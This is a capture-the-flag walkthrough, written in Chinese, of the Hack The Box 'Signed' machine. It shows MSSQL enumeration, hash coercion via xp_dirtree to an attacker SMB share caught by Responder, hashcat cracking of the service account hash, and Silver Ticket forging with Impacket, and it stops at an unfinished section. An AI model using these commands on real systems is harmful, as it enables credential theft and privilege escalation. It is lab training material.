## Signed
```
[★]$ nmap -sCV 10.129.242.173
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-19 03:47 CDT
Nmap scan report for 10.129.242.173
Host is up (0.0083s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RC0+
| ms-sql-info: 
|   10.129.242.173:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.242.173:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-19T08:45:44
|_Not valid after:  2056-03-19T08:45:44
|_ssl-date: 2026-03-19T08:47:55+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.20 seconds
[★]$ echo '10.129.242.173 dc01.signed.htb signed.htb' | sudo tee -a /etc/hosts
10.129.242.173 dc01.signed.htb signed.htb
```
#### Machine Information
```
As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH
```
#### 枚举
```
[★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH'  //域账户（Domain Account）
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [-] SIGNED.HTB\scott:Sm230#C5NatH (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
[★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth    //本地账户（Local Account）
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH 
```
#### 添加主机名
```
[★]$ sudo sed -i '$ s/$/ dc01/' /etc/hosts
```
#### 将使用 Impacket 连接mssqlclient.py到MSSQL
```
[★]$ mssqlclient.py scott:'Sm230#C5NatH'@dc01.signed.htb
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)> select @@version;  //全局变量@@version显示版本信息
                                                                                                                                                                                                                             
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
	Oct  8 2022 05:58:25 
	Copyright (C) 2022 Microsoft Corporation
	Developer Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   

SQL (scott  guest@master)> 
```
#### 提示信息显示 scott 用户拥有访客角色，并且默认数据库是 master 数据库。我可以明确地获取有关已登录用户的更多信息：
```
SQL (scott  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN();
                
-----   -----   
scott   scott   

SQL (scott  guest@master)> 
```
#### ORIGINAL_LOGIN()它提供已通过 MSSQL 身份验证的用户信息，以及SUSER_SNAME()映射到当前安全上下文的用户信息。在本例中，这两个用户是同一个人，但使用一个帐户登录可能会映射到 MSSQL 中的另一个用户。要明确查看权限，我可以同时检查服务器级和数据库级权限：
```
SQL (scott  guest@master)> select * from fn_my_permissions(NULL, 'SERVER');
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         

server                         VIEW ANY DATABASE   

SQL (scott  guest@master)> select * from fn_my_permissions(NULL, 'DATABASE');
entity_name   subentity_name   permission_name                             
-----------   --------------   -----------------------------------------   
database                       CONNECT                                     

database                       VIEW ANY COLUMN ENCRYPTION KEY DEFINITION   

database                       VIEW ANY COLUMN MASTER KEY DEFINITION
```
#### 在 MSSQL 枚举中，有一套“固定套路”：
```
常用函数包括：
fn_my_permissions 👉 看当前权限（⭐你现在用的）
SYSTEM_USER
IS_SRVROLEMEMBER
HAS_PERMS_BY_NAME
👉 这些属于：
MSSQL Enumeration Cheat Sheet（必背)
```
#### 这些数据库就是默认数据库：查询 sys.databases它是 MSSQL 里专门用来列出所有数据库的系统视图
```
SQL (scott  guest@master)> SELECT  name FROM sys.databases;
name     
------   
master   

tempdb   

model    

msdb
```
#### 由于没有什么有趣的数据可供查看，我将检查以下内容xp_cmdshell：
```
SQL (scott  guest@master)> xp_cmdshell whoami
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```
#### 该功能已被禁用，Scott 没有权限启用它。
#### 我会检查是否存在身份冒用和关联服务器，但这两项检查都没有发现任何异常：
```
SQL (scott  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
SQL (scott  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (scott  guest@master)> 
```
#### 该输出确认了当前服务器名称为 DC01，我也可以通过以下命令看到@@SERVERNAME：
```
SQL (scott  guest@master)> select @@SERVERNAME;
       
----   
DC01   

```
#### 列出登录名，只有 scott 和 sa（管理员）帐户：
#### mssqlclient.py enum_logins 命令 提供的快捷枚举命令，查询服务器角色权限
```
SQL (scott  guest@master)> enum_logins
name    type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-----   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa      SQL_LOGIN             0          1               0             0            0              0           0           0           0   

scott   SQL_LOGIN             0          0               0             0            0              0           0           0           0   
```
#### sa = MSSQL 默认超级管理员 ｜ is_disabled: 0 → 没被禁用 ｜ sysadmin: 1 → ⭐ 最高权限
#### xp_dirtree这将允许我枚举文件系统。我可以尝试读取以下内容C:\：
```
SQL (scott  guest@master)> xp_dirtree "C:\"
subdirectory   depth   file   
------------   -----   ----
```
#### 看起来 scott 可以运行该命令，但没有读取任何文件的权限。
### 域用户
#### MSSQL 提供了获取域用户信息的机制。例如，我可以查找域管理员帐户的 SID：
```
SQL (scott  guest@master)> SELECT SUSER_SID('SIGNED\Administrator');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'   

```
#### 也可以反其道而行之：
```
SQL (scott  guest@master)> SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000);
                       
--------------------   
SIGNED\Administrator   

```
#### 此 SID 为二进制格式，但 0xf4010000 是小端十六进制的 RID 500。如果我想查看哪些设备拥有 501 (0xf5010000)，MSSQL 将显示：
```
SQL (scott  guest@master)> SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca4f5010000);
               
------------   
SIGNED\Guest   

```
#### SUSER_SNAME 函数作用把 SID（二进制）转换成“用户名”
#### 域：SIGNED 用户：Guest | SID 枚举 / 用户识别（User Enumeration via SID）
#### netexec它提供了一个--rid-brute可以删除用户的选项：是不行的，
```
[★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth -M mssql_priv
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH
```
#### 没有发现任何“值得报告的权限”

<details>
<summary>常见 MSSQL 模块</summary>

```
[★]$ netexec mssql -L
LOW PRIVILEGE MODULES
[*] mssql_priv                Enumerate and exploit MSSQL privileges

HIGH PRIVILEGE MODULES (requires admin privs)
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] test_connection           Pings a host
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
```
</details>

#### 以访客身份登录后，首先要检查两件事：如果我可以冒充我们的链接，我就可以跳转到……
```
enum_links --> For links

enum_impersonate --> For if we can impersonate another user with privileges
```
### 以 mssqlsvc 身份进行身份验证 | 强制哈希 
#### 打算xp_dirtree尝试列出我控制的 SMB 共享中的一个目录。这将导致 MSSQL 尝试对我的共享进行身份验证（使用 MSSQL 运行所用的服务帐户），这样我就可以捕获 NetNTLMv2 质询/响应（哈希值）并尝试破解它。我将启动Responder：
https://github.com/lgandx/Responder
```
//系统自带的responder
 [★]$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
```
#### 现在我将尝试列出主机上 SMB 共享中的目录：
```
SQL (scott  guest@master)> xp_dirtree \\10.10.15.139\share
subdirectory   depth   file   
------------   -----   ----   
SQL (scott  guest@master)> 
```
#### Responder 中有一个哈希值：
```
[SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:2402d805c99ee0d0:660DF534BDAF0B295B10E0F94822666C:010100000000000080B930D510B8DC01D60656902490FD1A0000000002000800570033004100510001001E00570049004E002D0050004500360048004500500045004C0035004100360004003400570049004E002D0050004500360048004500500045004C003500410036002E0057003300410051002E004C004F00430041004C000300140057003300410051002E004C004F00430041004C000500140057003300410051002E004C004F00430041004C000700080080B930D510B8DC010600040002000000080030003000000000000000000000000030000074691A570B31EF9829B32DC4F245F376ED000D0ABA9999EC90CFF44E644C812C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100330039000000000000000000
```
#### 破解 NetNTLMv2
```
[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[★]$ gunzip rockyou.txt.gz
[★]$ hashcat mssqlsvc.hash rockyou.txt

MSSQLSVC::SIGNED:2402d805c99ee0d0:660df534bdaf0b295b10e0f94822666c:010100000000000080b930d510b8dc01d60656902490fd1a0000000002000800570033004100510001001e00570049004e002d0050004500360048004500500045004c0035004100360004003400570049004e002d0050004500360048004500500045004c003500410036002e0057003300410051002e004c004f00430041004c000300140057003300410051002e004c004f00430041004c000500140057003300410051002e004c004f00430041004c000700080080b930d510b8dc010600040002000000080030003000000000000000000000000030000074691a570b31ef9829b32dc4f245f376ed000d0aba9999ec90cff44e644c812c0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100330039000000000000000000:purPLE9795!@
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
```
#### purPLE9795!@
#### 此密码可用于非本地登录 MSSQL：
```
[★]$ netexec mssql DC01.signed.htb -u mssqlsvc -p 'purPLE9795!@' --local-auth
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [-] DC01\mssqlsvc:purPLE9795!@ (Login failed for user 'mssqlsvc'. Please try again with or without '--local-auth')
[★]$ netexec mssql DC01.signed.htb -u mssqlsvc -p 'purPLE9795!@' 
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
```
### Shell 作为 MSSQL | 枚举Enumeration
#### mssqlclient.py这次我可以-windows-auth使用 Windows 集成身份验证，通过域帐户连接：
```
[★]$ mssqlclient.py mssqlsvc:'purPLE9795!@'@DC01.signed.htb -windows-auth
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)> 
```
#### 该账户仍显示为访客权限。此账户并非管理员账户
```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0   

```
#### 这里存在一些冒充行为：
```
SQL (SIGNED\mssqlsvc  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee    grantor                        
----------   --------   ---------------   ----------   --------   ----------------------------   
b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser   
```
#### dc_admin 已被授予对 msdb 数据库中 MS_DataCollectorInternalUser 用户的 IMPERSONATE 权限。MS_DataCollectorInternalUser 是 msdb 中的一个内置高权限帐户。问题在于 dc_admin 并不存在于 msdb 数据库中。
```
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   

##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   

##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   

SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   

NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   

NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   

scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0   

SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   

SQL (SIGNED\mssqlsvc  guest@master)> 

```
#### 至少目前来看，这算是条死路。不过，enum_logins输出结果显示登录用户比 Scott 能看到的要多。除了 sa 之外，还有五个用户拥有 sysadmin 权限，以及一个名为 SIGNED\IT 的用户组
### Silver Ticket 银票
#### 银票证是使用服务帐户的 NTLM 哈希值伪造的 Kerberos 服务票证 (TGS)。与金票证（使用 krbtgt 哈希值伪造 TGT）不同，银票证针对特定服务。在本例中，由于我拥有 mssqlsvc 帐户的 NTLM 哈希值（或者原始密码，这使得计算 NTLM 哈希值变得非常简单），因此我可以为 MSSQL 服务生成服务票证 (TGS)
#### TGS 作为 mssqlsvc
#### 首先，我将证明我可以伪造一个我认识的用户 mssqlsvc 的工单。要创建工单，我需要：服务帐户密码的 NTLM 哈希值 ｜ 域 SID
#### 为了获取 NTLM 密码，我将使用 Python 和明文密码：
```
[★]$ python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
ef699384c3285c54128a3ee1ddb1a0cc
```
#### 要获取域名 SID，我将从数据库中获取一个 SID：
```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\Domain Users');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'
```
#### Python 可以使用Impacket提供的工具来实现这一点： 把二进制 SID 转换成标准格式 ｜ 5 = NT Authority 表示这是 Windows / AD 体系
```
[★]$ python3
Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
>>> from impacket.dcerpc.v5.dtypes import SID
>>> SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000')).formatCanonical()
'S-1-5-21-4088429403-1159899800-2753317549-513'
>>> exit()
```
#### 原始 SID 是一个采用小端字节序的二进制结构。以下是解析方法：
```
字节				场地					价值
01				修订					1
05				子机构数量			5
000000000005	标识符授权			5（NT 管理局）
15000000		子授权 1	0x00000015 = 21
5b7bb0f3		子授权 2	0xf3b07b5b = 4088429403
98aa2245		子授权 3	0x4522aa98 = 1159899800
ad4a1ca4		子授权 4	0xa41c4aad = 2753317549
01020000		子授权 5	0x00000201 = 513（域用户 RID）
```
#### 将所有这些组合在一起，就得到了 S-1-5-21-4088429403-1159899800-2753317549-513，SIGNED 域的 “Domain Users” 组
#### 域 SID 将是去掉末尾的 RID：S-1-5-21-4088429403-1159899800-2753317549
#### 把这些信息组合起来就成了一张车票：
```
[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 mssqlsvc
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```
#### 可以用它连接到 MSSQL：
```
[★]$ KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -no-pass -k DC01.signed.htbImpacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  guest@master)> 
```
#### 是以 mssqlsvc 用户身份：TGS 作为管理员 [失败]
```
SQL (SIGNED\Administrator  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN();
                                            
-------------------   -------------------   
SIGNED.HTB\mssqlsvc   SIGNED.HTB\mssqlsvc   

```
#### 以管理员身份创建工单：
```
[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 Administrator
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```
```
[★]$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN();
                                                      
------------------------   ------------------------   
SIGNED.HTB\Administrator   SIGNED.HTB\Administrator   

```
#### 遗憾的是，如上所示，数据库的设置使得管理员用户没有任何有用的权限
### TGS with IT Group
